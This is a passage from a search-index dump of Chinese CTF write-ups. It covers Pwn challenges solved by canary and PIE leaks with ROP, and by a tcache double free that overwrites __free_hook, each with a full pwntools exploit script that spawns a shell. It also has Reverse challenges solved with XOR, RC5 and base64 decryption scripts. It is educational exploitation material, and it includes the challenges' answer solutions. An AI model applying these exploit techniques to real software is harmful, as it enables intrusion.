()","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"201905/Pwn/#noflag","text":"","title":"noflag"},{"location":"201905/Pwn/#_5","text":"\u6808\u6ea2\u51fa canary \u7ed5\u8fc7 rop","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"201905/Pwn/#_6","text":"\u5728 main \u51fd\u6570\u4e2d\u5b58\u5728\u4e24\u6b21\u8f93\u5165\uff0c\u7b2c\u4e00\u6b21\u8f93\u51fa\u4f1a\u88ab\u91cd\u65b0\u6253\u5370\u51fa\u6765\u3002 \u56e0\u4e3a\u4f7f\u7528\u7684 read \u63a5\u53d7\u7684\u8f93\u5165\uff0c\u6240\u4ee5\u5728\u5b57\u7b26\u4e32\u672b\u5c3e\u4e0d\u4f1a\u6dfb\u52a0'\\0'\uff0c\u90a3\u4e48\u5728\u8f93\u51fa\u65f6\u5c31\u4e0d\u4f1a\u622a\u65ad\uff0c\u7531\u6b64\u53ef\u4ee5\u4e00\u6b21\u6027\u6cc4\u9732\u51fa\u6808\u4e0a\u7684 canary \u548c\u7a0b\u5e8f\u6bb5\u5730\u5740\u3002 \u53ea\u8981\u8f93\u5165 0x29 \u4e2a'a',\u5c31\u80fd\u6070\u597d\u8986\u76d6\u6389 canary \u6700\u4f4e\u4f4d\u7684'\\x00'\uff0c\u7136\u540e\u5f53\u7a0b\u5e8f\u8f93\u51fa\u65f6\uff0c\u5c31\u53ef\u4ee5\u6210\u529f\u6cc4\u9732\u51fa canary \u4ee5\u53ca\u5b83\u540e\u9762\u7684\u4e00\u4e2a\u4ee3\u7801\u6bb5\u7684\u5730\u5740\u3002\u8be5\u4ee3\u7801\u6bb5\u5730\u5740\u4e0e\u4ee3\u7801\u6bb5\u57fa\u5740\u6709\u4e00\u4e2a\u56fa\u5b9a\u7684\u504f\u79fb\uff0c\u51cf\u53bb\u8be5\u504f\u79fb\u65e2\u53ef\u83b7\u5f97\u57fa\u5740\u3002\u5230\u6b64\uff0c\u4e5f\u5c31\u540c\u65f6\u7ed5\u8fc7\u4e86 pie \u548c canary\u3002 \u7136\u540e\u7a0b\u5e8f\u4f1a\u63a5\u53d7\u7b2c\u4e8c\u6b21\u8f93\u5165\uff0c\u8fd9\u6b21\u8f93\u5165\u5c31\u9700\u8981\u4fee\u590d\u521a\u521a\u88ab\u4fee\u6539\u6389\u6700\u540e\u4e00\u5b57\u8282\u7684 canary\uff0c\u540c\u65f6\u5c06\u8fd4\u56de\u5730\u5740\u4fee\u6539\u4e3a main \u51fd\u6570\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4e8c\u6b21\u5229\u7528\u6f0f\u6d1e\u4e86 \u5728\u7b2c\u4e8c\u6b21\u6267\u884c main \u51fd\u6570\u4e2d\uff0c\u5728\u8f93\u5165\u65f6\u8f93\u5165 0xc0 \u4e2a'a'\uff0c\u5c31\u53ef\u4ee5\u6cc4\u9732\u51fa\u4e00\u4e2a\u4f4d\u4e8e ld \u4e2d\u7684\u5730\u5740\uff0c\u6539\u5730\u5740\u5230 libc \u57fa\u5740\u7684\u504f\u79fb\u56fa\u5b9a\uff0c\u6240\u4ee5\u7531\u6b64\u53ef\u4ee5\u6cc4\u9732\u51fa libc \u7684\u57fa\u5740\u3002 \u5728\u7b2c\u4e8c\u6b21\u8f93\u5165\u65f6\uff0c\u7531\u4e8e\u6cc4\u9732\u51fa\u4e86 libc \u57fa\u5740\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7 rop \u4e3a\u6240\u6b32\u4e3a\u4e86 2333\u3002\u8fd9\u91cc exp \u662f\u7528\u7684 one_gadget\uff0c\u56e0\u4e3a\u4e8b\u5148\u5df2\u7ecf\u901a\u8fc7 rop \u6cc4\u9732\u51fa\u7684\u51fd\u6570\u5730\u5740\u5f97\u5230\u4e86\u8fdc\u7a0b\u7684 libc \u7248\u672c\u4e3a 2.23(rop \u4ee3\u7801\u5c31\u4e0d\u7ed9\u51fa\u4e86)\u3002 from pwn import * p = process ( './noflag' ) p . recvuntil ( 'length of name: \\n ' ) p . sendline ( str ( 0x29 )) p . recvuntil ( 'name: \\n ' ) p . send ( 'a' * 0x29 ) p . recvuntil ( 'a' * 0x28 ) canary = u64 ( p . recvn ( 8 )) / 0x100 * 0x100 pie = u64 ( p . recvuntil ( 'l' )[: - 1 ] . ljust ( 8 , ' \\x00 ' )) - 0xe10 print \"canary: %#x \" % canary print \"pie: %#x \" % pie main = pie + 0xd21 p . recvuntil ( 'of introduction: \\n ' ) p . sendline ( str ( 0x40 )) p . recvuntil ( 'introduction: \\n ' ) p . send ( 'a' * 0x28 + p64 ( canary ) + p64 ( 0xdeadbeef ) + p64 ( main )) p . recvuntil ( 'length of name: \\n ' ) p . sendline ( str ( 0xc0 )) p . recvuntil ( 'name: \\n ' ) p . send ( 'a' * 0xc0 ) p . recvuntil ( 'a' * 0xc0 ) libc_base = u64 ( p . recvuntil ( 'l' )[: - 1 ] . ljust ( 8 , ' \\x00 ' )) - 0x3da7cb print \"libc_base: %#x \" % libc_base one_gadget = libc_base + 0x4526a payload = 'a' * 0x28 + p64 ( canary ) + p64 ( 0xdeadbeef ) + p64 ( one_gadget ) payload = payload . ljust ( 0xc0 , ' \\x00 ' ) p . recvuntil ( 'of introduction: \\n ' ) p . sendline ( str ( 0xc0 )) p . recvuntil ( 'introduction: \\n ' ) p . send ( payload ) p . interactive () \u7136\u800c\u8fd9\u9898\u4e0d\u6b62\u4e00\u4e2a\u89e3\uff0c\u53ef\u4ee5\u4e0d\u7528\u6cc4\u9732 libc\uff0c\u901a\u8fc7\u6784\u9020 rop \u8c03\u7528 fopen \u548c fscanf \u6765\u8bfb\u53d6 flag \u4e5f\u884c\uff0c\u4e0d\u8fc7\u5c31\u9ebb\u70e6\u4e86\u8bb8\u591a\u3002","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"201905/Pwn/#club","text":"","title":"club"},{"location":"201905/Pwn/#_7","text":"\u901a\u8fc7\u5199\u6cc4\u9732\u5806\u5730\u5740\u63a8\u6d4b libc \u7248\u672c fastbin attack \u901a\u8fc7 unsorted bin \u6cc4\u9732 libc tcache \u5229\u7528","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"201905/Pwn/#_8","text":"\u68c0\u67e5\u9898\u76ee\u4fdd\u62a4\uff0c\u53d1\u73b0\u4fdd\u62a4\u5168\u5f00 \u9996\u5148\u8fde\u7eed\u6dfb\u52a0\u591a\u4e2a member\uff0c\u7136\u540e\u518d\u4f9d\u6b21\u91ca\u653e\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e8c\u4e2a member\uff0c\u4f7f\u5f97\u7b2c\u4e8c\u4e2a chunk \u7684 fd \u6307\u5411\u4e86\u7b2c\u4e00\u4e2a chunk \u7684\u5730\u5740\u3002\u518d\u6b21\u5c06\u7b2c\u4e8c\u4e2a chunk \u5206\u914d\u51fa\u6765\uff0cname \u8bbe\u7f6e\u4e3a'b'\uff0c\u8fd9\u53ea\u4f1a\u4fee\u6539\u6389\u5806\u5730\u5740\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u901a\u8fc7 edit(1, 'b')\u8f93\u51fa\u8be5 chunk \u7684 fd\u3002\u53ef\u4ee5\u53d1\u73b0\uff0c\u5730\u5740\u7684\u7b2c 3 \u4f4d\u4e0d\u4e3a 0\uff0c\u800c\u662f 2\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u5806\u4e0a\u4e8b\u5148\u5206\u914d\u4e86\u4e00\u4e2a 0x200 \u5927\u5c0f\u4ee5\u4e0a\u7684 chunk\uff0c\u8054\u7cfb\u5230 libc2.27 \u4ee5\u4e0a\u4f1a\u5728\u5806\u4e0a\u5f00\u8f9f\u4e00\u4e2a 0x250 \u5927\u5c0f\u7684\u7a7a\u95f4\u7528\u4e8e\u7ba1\u7406 tcache\uff0c\u4ece\u800c\u786e\u5b9a\u6587\u4ef6\u73af\u5883\u662f\u5b58\u5728 tcache \u7684\u3002 \u89c2\u5bdf\u5230\u6bcf\u6b21 remove \u90fd\u4f1a\u6e05\u7a7a name\uff0c\u4f46\u662f\u5f53\u6211 remove \u65f6\u53ea\u8f93\u5165\u56de\u8f66\uff0c\u5c31\u4f1a\u5bfc\u81f4'\\0'\u4e0e'\\0'\u6bd4\u8f83\uff0c\u4ece\u800c\u4f7f\u5df2\u7ecf free \u7684\u5806\u5757\u518d\u6b21\u88ab\u91ca\u653e\uff0c\u9020\u6210 double free\u3002\u7531\u56e0\u4e3a\u5177\u6709 tcache\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5728\u4efb\u610f\u5730\u5740\u5206\u914d chunk\u3002 \u4e3a\u4e86\u6cc4\u9732 libc \u7684\u57fa\u5740\uff0c\u5148\u901a\u8fc7 double free\uff0c\u5728\u5806\u4e0a\u5206\u914d\u4e00\u4e2a\u9519\u4f4d\u4e86 chunk\uff0c\u4ece\u800c\u53ef\u4ee5\u4fee\u6539\u6389\u4e00\u4e2a\u6b63\u5e38\u5806\u5757 victim \u7684 size\uff0c\u5c06 size \u4fee\u6539\u4e3a 0xc1\uff0c\u4f7f\u5176\u53d8\u6210\u4e00\u4e2a smallchunk\uff0c\u7136\u540e\u91ca\u653e\u6389 victim\uff0c\u5c31\u53ef\u4ee5\u5728 fd \u548c bk \u7684\u4f4d\u7f6e\u83b7\u5f97 libc \u4e2d\u7684\u5730\u5740\u3002\u518d\u6b21\u5c06\u8be5\u5904\u5185\u5b58\u5206\u914d\u51fa\u6765\uff0c\u5c31\u53ef\u4ee5\u6cc4\u9732\u51fa libc \u7684\u5730\u5740\u4e86\u3002 \u901a\u8fc7 double free \u5728__free_hook \u5904\u5206\u914d chunk\uff0c\u7136\u540e\u5199\u5165 libc2.27 \u7684 one_gadget \u7684\u5730\u5740\u6210\u529f getshell from pwn import * context . log_level = 'debug' p = process ( \"./contact\" ) libc = ELF ( './libc.so.6' ) #libc\u7248\u672c\u4e3a2.27 def add ( name , description ): p . recvuntil ( '> ' ) p . sendline ( '1' ) p . recvuntil ( 'name: ' ) p . sendline ( name ) p . recvuntil ( 'description(max 0x29bytes): \\n ' ) p . send ( description ) def remove ( name ): p . recvuntil ( '> ' ) p . sendline ( '2' ) p . recvuntil ( 'name of member: \\n ' ) p . sendline ( name ) def edit ( idx , description ): p . recvuntil ( '> ' ) p . sendline ( '3' ) p . recvuntil ( 'number of member: \\n ' ) p . sendline ( str ( idx )) p . recvuntil ( 'new description: \\n ' ) p . send ( description ) add ( 'a' , 'a' ) add ( 'b' , 'b' ) add ( 'c' , 'c' ) add ( 'd' , 'd' ) add ( 'e' , 'e' ) add ( 'x' , 'x' ) add ( 'x' , 'x' ) remove ( 'x' ) remove ( 'x' ) remove ( 'a' ) remove ( '' ) add ( 'a' , 'a' ) edit ( 0 , 'a' ) p . recvuntil ( 'a: ' ) heap_base = u64 ( p . recvline ()[: - 1 ] . ljust ( 8 , ' \\x00 ' )) / 0x1000 * 0x1000 + 0x250 print \"heap_base: %#x \" % heap_base payload = p64 ( heap_base + 0x30 ) edit ( 0 , payload ) add ( 'f' , 'f' ) payload = p64 ( 0 ) * 3 + p64 ( 0xc1 ) add ( 'g' , payload ) remove ( 'b' ) for _ in range ( 7 ): remove ( '' ) add ( 'b' , 'b' ) edit ( 1 , 'a' * 8 ) p . recvuntil ( 'b: aaaaaaaa' ) libc_base = u64 ( p . recvline ()[: - 1 ] . ljust ( 8 , ' \\x00 ' )) - 0x3ebd50 free_hook = libc_base + libc . symbols [ '__free_hook' ] one_gadget = libc_base + 0x4f322 print \"libc_base: %#x \" % libc_base print \"free_hook: %#x \" % free_hook edit ( 1 , p64 ( 0 )) remove ( 'a' ) remove ( '' ) add ( 'a' , p64 ( free_hook )) add ( 't' , '/bin/sh \\x00 ' ) add ( 'p' , p64 ( one_gadget )) remove ( 't' ) p . interactive ()","title":"\u89e3\u9898\u601d\u8def"},{"location":"201905/Reverse/","text":"REVERSE \u00b6 baby \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 \u6590\u6ce2\u90a3\u5951\u6570\u5217 \u7b80\u5355\u7684\u5f02\u6216\u52a0\u5bc6 \u89e3\u9898\u601d\u8def \u00b6 \u4e3b\u8981\u662f\u63d0\u53d6\u51fa key\uff0c\u7136\u540e\u5f02\u6216\u56de\u53bb\u5c31\u5b8c\u4e8b\u4e86\u3002 table = [ 0x64 , 0x6f , 0x64 , 0x6f , 0x76 , 0x2c , 0x13 , 0x41 , 0x6a , 0xcf , 0x9c , 0x26 , 0x1b , 0xeb , 0x48 , 0x6a , 0xa , 0x2b , 0xf3 , 0x5c , 0x83 , 0x54 , 0x4e , 0x77 , 0x2e , 0x47 , 0x8c , 0x55 ] def fibbo ( n ): a , b = 0 , 1 for i in range ( n ): a , b = b , a + b return a for i , val in enumerate ( table ): print ( chr (( val ^ fibbo ( i + 3 )) & 0xff ), end = '' ) baby(dondayoo~\u6218\u961f wp) \u00b6 Windows \u7a0b\u5e8f\uff0c\u5148\u8fd0\u884c\u770b\u770b \u4e71\u8f93\u4e00\u4e2a\uff0c\u76f4\u63a5\u9000\u51fa\u3002\u7136\u540e\u653e\u8fdb IDA \u91cc\u5206\u6790 \u770b\u5230\u8fd9\u91cc\u6ca1\u6709 main \u51fd\u6570\uff0c\u641c\u7d22\u4e00\u4e0b\u5b57\u7b26\u4e32 Input \u70b9\u5f00 401030 \u51fd\u6570\uff0cF5 \u53cd\u6c47\u7f16\uff0c\u786e\u5b9a\u8fd9\u4e2a\u662f main \u51fd\u6570 \u8fd9\u6bb5\u4ee3\u7801\u53ef\u4ee5\u76f4\u63a5\u770b\u61c2\uff0c401180 \u548c 401130 \u5206\u522b\u662f printf \u548c scanf\uff0c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u4e3a 30 \u63a5\u4e0b\u6765 while \u5faa\u73af\u91cc\u505a\u4e86\u4e00\u4e2a\u5f02\u6216\u64cd\u4f5c\uff0c\u518d\u5224\u65ad\u662f\u5426\u548c\u5185\u5b58\u4e2d\u7684\u6570\u636e\u76f8\u7b49\uff0c\u76f8\u7b49\u5219\u8f93\u5165\u6b63\u786e \u53d8\u91cf v3 \u662f\u8f93\u5165\u7684\u5b57\u7b26\u4e32\uff0cv4 \u662f 401000 \u751f\u6210\u7684\u4e00\u4e2a\u6570\u636e\uff0c\u8fdb\u5165 401000 \u5206\u6790 \u8fd9\u662f\u4e00\u4e2a\u9012\u5f52\u51fd\u6570 \u4e00\u5f00\u59cb\u6ca1\u770b\u660e\u767d\u662f\u505a\u4ec0\u4e48\u7528\u7684\uff0c\u7528 python \u5bf9\u7167\u7740\u5199\u4e86\u4e00\u4e0b \u5f88\u660e\u663e\uff0c\u51fd\u6570\u8fd4\u56de\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7b2c n \u4e2a\u503c \u6240\u4ee5\u76ee\u6807\u5c31\u662f\u8ba9\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u548c\u6590\u6ce2\u90a3\u5951\u6570\u5217\u8fdb\u884c\u5f02\u6216\u7684\u503c\u4e0e byte_41C7D4 \u76f8\u7b49 \u628a\u8fd9\u6bb5\u6570\u636e dump \u51fa\u6765\uff0c\u7f16\u5199 python \u811a\u672c from libnum import n2s def func ( num ): v1 = num if ( num == 0 or num == 1 ): return num v2 = func ( num - 2 ) return ( v2 + func ( v1 - 1 )) & 2 ** 8 - 1 arr = [] for i in range ( 30 ): arr . append ( func ( i + 3 )) c = '71 60 70 6B 79 73 59 0E 68 E6 DA 26 17 84 44 28 20 1F 9D 69 C0 53 63 45 1D 35 D9 1C E4 78' . split ( ' ' ) c = list ( map ( lambda x : int ( '0x' + x , 16 ), c )) flag = '' print ( arr , c ) for i in range ( 30 ) : flag += ( n2s ( arr [ i ] ^ c [ i ])) print ( flag ) showme666 \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 \u6c47\u7f16\u7406\u89e3 gdb \u8c03\u8bd5 patch \u89e3\u9898\u601d\u8def \u00b6 \u8fd9\u9053\u9898\u89e3\u9898\u601d\u8def\u4e0d\u552f\u4e00 \u6700\u7b80\u5355\u7684\u662f\u7528 gdb \u8c03\u8bd5\u65f6\uff0c\u4fee\u6539 rip \u5230 0x4006b6\uff0c\u7136\u540e\u7ee7\u7eed\u8fd0\u884c\uff0c\u5c31\u53ef\u8f93\u51fa flag \u7136\u540e\u7ee7\u7eed\u8fd0\u884c\u5373\u53ef showme666(dondayoo~\u6218\u961f wp) \u00b6 \u5148\u8fd0\u884c\u7a0b\u5e8f\u770b\u770b \u662f\u4e00\u4e2a\u63b7\u9ab0\u5b50\u7a0b\u5e8f\uff0c\u5fc5\u987b 5 \u4e2a\u90fd\u662f 6 \u70b9\u624d\u80fd\u901a\u8fc7\uff0c\u5206\u6790\u7a0b\u5e8f\u7c7b\u578b 64 \u4f4d ELF \u7a0b\u5e8f\uff0c\u7528 IDA64 \u6253\u5f00 \u968f\u673a\u6570\u662f\u7528\u65f6\u95f4\u4f5c\u4e3a\u79cd\u5b50\u751f\u6210\uff0c\u4e0d\u53ef\u63a7\u5236 \u800c\u4e14\u8fd8\u6709\u53cd\u4f5c\u5f0a\u673a\u5236\uff0c666 \u8fd9\u4e00\u6bb5\u662f\u6700\u7ec8\u7ed3\u679c\u90e8\u5206\uff0c\u5982\u679c\u63b7\u51fa 5 \u4e2a 6 \u70b9\uff0c\u4f1a\u8c03\u7528 4006B6 \u51fd\u6570\uff0c\u8fdb\u5165\u51fd\u6570\u67e5\u770b \u5176\u4e2d\u6709 putchar\uff0c\u8bf4\u660e\u8be5\u51fd\u6570\u4f1a\u8f93\u5165\u5b57\u7b26\uff0c\u5e94\u8be5\u5c31\u662f\u8f93\u51fa flag\u3002\u6700\u91cd\u8981\u7684\u662f\u8be5\u51fd\u6570\u6ca1\u6709\u53c2\u6570\u4f20\u5165\uff0c\u6240\u4ee5\u53ea\u8981\u52a8\u6001\u8c03\u8bd5\u76f4\u63a5\u5c06\u51fd\u6570\u5730\u5740\u4f5c\u4e3a IP \u5c31\u80fd\u591f\u6267\u884c\u8be5\u51fd\u6570 \u4e00\u8def\u6267\u884c\u5230\u5e95\uff0c\u8f93\u51fa\u4e86 flag \u8981\u628a flag \u6362\u6210 scuctf rcrcrc \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 \u7b97\u6cd5\u5206\u6790 python \u811a\u672c\u7f16\u5199 \u89e3\u9898\u601d\u8def \u00b6 \u8fd9\u9898\u4e3b\u8981\u8003\u5bdf\u9006\u5411\u5206\u6790\u80fd\u529b\uff08\u7eb8\u4e0a\u6253\u4e2a\u8349\u7a3f\uff0c\u4ee3\u7801\u9006\u7740\u5199\u5c31\u884c\u4e86 \u89e3\u9898\u811a\u672c\u5982\u4e0b(C \u8bed\u8a00) #include <stdio.h> unsigned int key [] = { 0xF4A956BF , 0xBA568F3D , 0xD73A7F7C , 0x817F532B }; unsigned int T [] = { 0xd24aaa79 , 0x0bf82ac7 , 0x6d08584c , 0x4b7703cf , 0xeb5a5436 , 0x04fc4110 , 0x07a6c88e , 0xcce3bc69 , 0x67b581db , 0x42958bd7 , 0xfde60589 , 0xfbc21664 , 0x56fc110f , 0x224189f6 , 0x0da07f95 , 0xfb0506e6 , 0x1b02b4d0 , 0x4c263256 , 0x1bf60164 , 0x79ad7531 , 0xe0fa6867 , 0xe06b6073 , 0xd63b49ce , 0xa5d0d5fe , 0x89713ab9 , 0x3258490d }; unsigned int func ( unsigned int a , unsigned int b ) { return (( a >> ( b & 0x1f )) | ( a << ( 32 - b & 0x1f ))) & 0xffffffff ; } int main () { int i , j ; for ( i = 2 ; i >= 0 ; i -= 2 ) { unsigned int a = key [ i ]; unsigned int b = key [ i + 1 ]; for ( j = 11 ; j >= 0 ; j -- ) { b -= T [ 2 * i + 1 ]; b = func ( b , a ) ^ a ; a -= T [ 2 * i ]; a = func ( a , b ) ^ b ; } key [ i ] = a - 0xd24aaa79 ; key [ i + 1 ] = b - 0x0bf82ac7 ; } printf ( \"%s\" , key ); } rcrcrc(dondayoo~\u6218\u961f wp) \u00b6 Linux \u7a0b\u5e8f\uff0c\u5148\u8fd0\u884c\u770b\u770b \u7a0b\u5e8f\u6ca1\u6709\u4efb\u4f55\u8f93\u51fa\uff0c\u968f\u4fbf\u8f93\u5165\u5b57\u7b26\uff0c\u7a0b\u5e8f\u9000\u51fa\uff0cIDA64 \u6253\u5f00\u5206\u6790 main \u51fd\u6570\u4e2d\u6709 scanf \u548c\u51e0\u4e2a\u53d8\u91cf\u5b9a\u4e49\uff0c\u6700\u7ec8\u5224\u65ad\u56db\u4e2a\u53d8\u91cf\u503c\u662f\u5426\u6b63\u786e \u5148\u8fdb\u5165 400894 \u67e5\u770b \u5176\u4e2d ROL \u548c\u90e8\u5206\u53d8\u91cf\u7684\u540d\u5b57\u662f\u6211\u81ea\u5df1\u4fee\u6539\u8fc7\u7684\uff0c\u70b9\u5f00 ROL \u5f88\u5bb9\u6613\u5206\u6790\u51fa\u8fd9\u662f\u5faa\u73af\u5de6\u79fb\u51fd\u6570 \u770b\u5230 \u8fd9\u6837\u7684\u7ed3\u6784\uff0c\u518d\u7ed3\u5408\u9898\u76ee\u540d\u5b57\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u65ad\u5b9a\u8fd9\u662f\u4e00\u4e2a RC5 \u52a0\u5bc6\u7a0b\u5e8f\uff0c\u518d\u8fdb\u5165 4006FC \u67e5\u770b \u53ef\u4ee5\u786e\u5b9a\u662f RC5 \u52a0\u5bc6\uff0c\u4e00\u4e2a\u5206\u7ec4\u662f int\uff0c\u4e5f\u5c31\u662f 32 \u4f4d\uff0c\u505a 12 \u8f6e\u5faa\u73af\uff0c400894 \u662f\u5bc6\u94a5\u6269\u5c55\u51fd\u6570\uff0c4006FC \u662f\u52a0\u5bc6\u51fd\u6570\uff0c\u9644\u4e24\u9875 ppt \u4f46\u4e0e\u4e00\u822c\u7684 RC5 \u4e0d\u540c\u7684\u662f\uff0c\u7a0b\u5e8f\u6bcf\u4e00\u8f6e\u4f7f\u7528\u7684\u5b50\u5bc6\u94a5\u662f\u4e00\u6837\u7684 \u5faa\u73af\u53d8\u91cf j \u4f5c\u4e3a\u5bc6\u94a5\u6570\u7ec4\u7d22\u5f15\uff0c\u6ca1\u6709\u4fee\u6539 \u8981\u8fdb\u884c\u89e3\u5bc6\uff0c\u9996\u5148\u8981\u83b7\u5f97\u4f7f\u7528\u7684\u5b50\u5bc6\u94a5\uff0c\u5728\u8fd9\u91cc\u65e0\u9700\u5bf9\u5bc6\u94a5\u6269\u5c55\u51fd\u6570\u8fdb\u884c\u5206\u6790\uff0c\u76f4\u63a5\u5728\u52a8\u6001\u8c03\u8bd5\u4e2d\u4ece\u5185\u5b58 dump \u51fa\u5404\u4e2a\u5b50\u5bc6\u94a5\u5373\u53ef \u53ef\u4ee5\u5f97\u5230 4 \u4e2a\u5b50\u5bc6\u94a5 0xd24aaa79,0x0bf82ac7,0xeb5a5436,0x04fc4110 \u6309\u7167\u5bc6\u94a5\u7684\u4f7f\u7528\u987a\u5e8f\uff0c\u7f16\u5199\u89e3\u5bc6\u7a0b\u5e8f import libnum def ror ( num , d ): tmp = num >> ( d & 0x1f ) return tmp | (( num << ( 32 - ( d & 0x1f ))) & 2 ** 32 - 1 ) s = [ 0xd24aaa79 , 0x0bf82ac7 , 0xeb5a5436 , 0x04fc4110 ] cipher = [ 0xf4a956bf , 0xba568f3d , 0xd73a7f7c , 0x817f532b ] message = [] for r in range ( 0 , 3 , 2 ): ld = cipher [ r ] rd = cipher [ r + 1 ] for rnd in range ( 12 ): rd = ror (( rd - s [ r + 1 ]) & 2 ** 32 - 1 , ld ) ^ ld ld = ror (( ld - s [ r ]) & 2 ** 32 - 1 , rd ) ^ rd rd = ( rd - s [ 1 ]) & 2 ** 32 - 1 ld = ( ld - s [ 0 ]) & 2 ** 32 - 1 message . append ( libnum . n2s ( ld )) message . append ( libnum . n2s ( rd )) print ( message ) \u8fd0\u884c\u5f97\u5230 \u4f3c\u4e4e\u4e0d\u662f\u53ef\u8bfb\u7684\u5b57\u7b26\u4e32\uff0c\u4f46\u786e\u5b9e\u90fd\u843d\u5728 ASCII \u8303\u56f4\u5185\uff0c\u770b\u4e86\u534a\u5929\uff0c\u6ce8\u610f\u5230 linux \u662f\u5c0f\u7aef\u4f4d\u5e8f\uff0c\u8fd9\u4e2a\u7ed3\u679c\u4e5f\u662f\u5c0f\u7aef\u65b9\u5f0f\u8f93\u51fa\u7684\uff0c\u5b9e\u9645 flag \u5e94\u8be5\u5012\u8fc7\u6765 rc5_fking_boring baha \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 base64 \u7b97\u6cd5\u9006\u5411 \u7206\u7834\u54c8\u5e0c\u7b97\u6cd5 \u89e3\u9898\u601d\u8def \u00b6 \u9996\u5148\u9006\u5411 base64\uff0c\u4f7f\u7528\u968f\u673a\u6570\u6253\u4e71\u4e86\u539f\u59cb\u7d22\u5f15\u8868\uff0c\u4f46\u662f\u968f\u673a\u6570\u7ed3\u679c\u4f7f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u751f\u6210\u7684\u65b0\u7d22\u5f15\u8868\u4e5f\u56fa\u5b9a\u3002 base64 \u89e3\u5bc6\u811a\u672c\u5982\u4e0b\uff1a key = 'pj+Oh2IXB6dyV5ArzmDtML0ZkeqPgwfvJbaSEHnxUY79K4Go3u/TC1sl8iFQWcNR' T = 'kEjTmtB3VtHvgs51kl5v' b = '' for i in T : if i == '=' : b += '000000' break tmp = key . find ( i ) tmp = bin ( tmp )[ 2 :] if not len ( tmp ) == 0 : if len ( tmp ) < 6 : for _ in range ( 6 - len ( tmp )): b += '0' b += tmp j = 0 for i in range ( 0 , len ( b ), 8 ): print ( chr ( int ( b [ i : i + 8 ], 2 )), end = '' ) j += 1 \u7136\u540e\u662f\u7206\u7834\u8f93\u5165\u4e3a 9 \u4f4d\u6570\u5b57\u7684\u54c8\u5e0c\u51fd\u6570\uff0c\u5927\u4f6c\u4eec\u592a\u5f3a\u4e86\uff0c\u76f4\u63a5\u628a\u51fd\u6570\u590d\u539f\u4e86\uff0c\u9884\u671f\u89e3\u5982\u4e0b //#include \"stdafx.h\" #include <windows.h> #include <stdio.h> typedef __int64 ( * func )(); int main () { //char * hmod = (char *)LoadLibraryA(\"C:\\\\Users\\\\hgy\\\\Desktop\\\\hxb\\\\reverse_1\\\\reverse.exe\"); FILE * fp ; fp = fopen ( \"./baha.exe\" , \"rb\" ); size_t len = 0 ; fseek ( fp , 0 , SEEK_END ); len = ftell ( fp ); fseek ( fp , 0 , SEEK_SET ); char * hmod = ( char * ) VirtualAllocEx ( GetCurrentProcess (), 0 , len , MEM_COMMIT , PAGE_EXECUTE_READWRITE ); fread ( hmod , len , 1 , fp ); func hash = ( func ) & hmod [ 0x560 ]; unsigned long long res ; char flag [ 0x30 ] = \"b@sE2019_scucs_\" ; for ( flag [ 15 ] = '0' ; flag [ 15 ] < '0' + 10 ; flag [ 15 ] ++ ) for ( flag [ 16 ] = '0' ; flag [ 16 ] < '0' + 10 ; flag [ 16 ] ++ ) for ( flag [ 17 ] = '0' ; flag [ 17 ] < '0' + 10 ; flag [ 17 ] ++ ) for ( flag [ 18 ] = '0' ; flag [ 18 ] < '0' + 10 ; flag [ 18 ] ++ ) { for ( flag [ 19 ] = '0' ; flag [ 19 ] < '0' + 10 ; flag [ 19 ] ++ ) for ( flag [ 20 ] = '0' ; flag [ 20 ] < '0' + 10 ; flag [ 20 ] ++ ) for ( flag [ 21 ] = '0' ; flag [ 21 ] < '0' + 10 ; flag [ 21 ] ++ ) for ( flag [ 22 ] = '0' ; flag [ 22 ] < '0' + 10 ; flag [ 22 ] ++ ) for ( flag [ 23 ] = '0' ; flag [ 23 ] < '0' + 10 ; flag [ 23 ] ++ ) { unsigned int addr = ( unsigned int ) flag ; __asm { mov ecx , addr } res = hash (); if ( res == 0x8181433626e17720 ) { printf ( \"found: %s\" , flag ); exit ( 0 ); } } printf ( \"%s -- %#llx \\n \" , flag , res ); } return 0 ; } \u8fd9\u91cc\u6709\u4e2a\u5c0f\u5751\u662f\uff0c\u54c8\u5e0c\u51fd\u6570\u91c7\u7528_thiscall \u8c03\u7528\u7684\uff0c\u6240\u4ee5\u6211\u7528\u7684\u5185\u8054\u6c47\u7f16\u7ed9\u51fd\u6570\u4f20\u7684\u53c2\u6570\u3002\u4e0d\u8fc7\u5927\u4f6c\u4eec\u76f4\u63a5\u590d\u539f\u4e86\u51fd\u6570\uff0c\u4e5f\u5c31\u6ca1\u8fd9\u4e9b\u95ee\u9898\u4e86 2333. baha(dondayoo~\u6218\u961f wp) \u00b6 Windows \u7a0b\u5e8f\uff0c\u8fd0\u884c\u770b\u770b \u4e24\u6bb5\u8f93\u5165\uff0c\u6709\u9519\u8bef\u63d0\u793a\uff0cIDA \u6253\u5f00\u5206\u6790 \u6ca1\u6709 main \u7b26\u53f7\uff0c\u641c\u7d22\u5b57\u7b26\u4e32 Welcome \u8fdb\u5165 main \u51fd\u6570\u67e5\u770b \u5176\u4e2d\u90e8\u5206\u53d8\u91cf\u540d\u548c\u51fd\u6570\u540d\u662f\u81ea\u5df1\u4fee\u6539\u8fc7\u7684\uff0c\u7a0b\u5e8f\u9996\u5148\u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u5bf9\u7b2c\u4e8c\u6b21\u8f93\u5165\u8fdb\u884c\u5224\u65ad\uff0c\u8fdb\u5165 check_is_number \u51fd\u6570\u67e5\u770b 